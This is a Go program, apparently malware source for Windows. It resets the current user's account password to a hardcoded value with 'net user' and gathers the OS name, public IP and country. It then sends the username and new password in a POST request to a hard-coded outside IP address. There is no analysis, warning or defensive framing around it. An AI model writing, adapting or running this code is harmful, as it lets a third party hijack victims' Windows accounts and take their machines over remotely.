package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
	"os/user"
	"strings"
)

type Data struct {
	OS       string `json:"os"`
	IP       string `json:"ip"`
	Username string `json:"username"`
	Password string `json:"password"`
	Token    string `json:"token"`
	Country  string `json:"country"`
}

func main() {
	headers := map[string]string{
		"Content-Type": "application/json",
		"Accept":       "text/plain",
	}

	currentUser, err := user.Current()
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	_us := currentUser.Username
	if strings.Contains(_us, "\\") {
		parts := strings.Split(_us, "\\")
		_us = parts[len(parts)-1]
	}

	_p := "adiyaksa12$"
	_t := ""

	_ = _p
	_ = _t

	_v := exec.Command("wmic", "os", "get", "Caption", "/value")
	_c2 := exec.Command("net", "user", _us, _p)

	_out, err := _v.Output()

	if err != nil {
		fmt.Println("Gagal menjalankan perintah:", err)
		return
	}

	_c2.Run()

	caption := strings.SplitN(string(_out), "=", 2)

	publicIP, err := getPublicIP()

	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	country, err := getCountryFromIP(publicIP)
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	data := Data{
		OS:       strings.TrimSpace(caption[1]),
		IP:       publicIP,
		Username: _us,
		Password: _p,
		Token:    _t,
		Country:  country,
	}

	jsonPayload, _ := json.Marshal(data)

	req, _ := http.NewRequest("POST", "http://43.133.138.170:80/post_data", bytes.NewBuffer(jsonPayload))
	for key, value := range headers {
		req.Header.Set(key, value)
	}

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	defer resp.Body.Close()
}

func getPublicIP() (string, error) {
	resp, err := http.Get("http://wtfismyip.com/text")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	ipBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return strings.TrimSpace(string(ipBytes)), nil
}

func getCountryFromIP(ip string) (string, error) {
	resp, err := http.Get("http://ip-api.com/json/" + ip)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	var result struct {
		Country string `json:"country"`
	}

	err = json.NewDecoder(resp.Body).Decode(&result)
	if err != nil {
		return "", err
	}

	return result.Country, nil
}
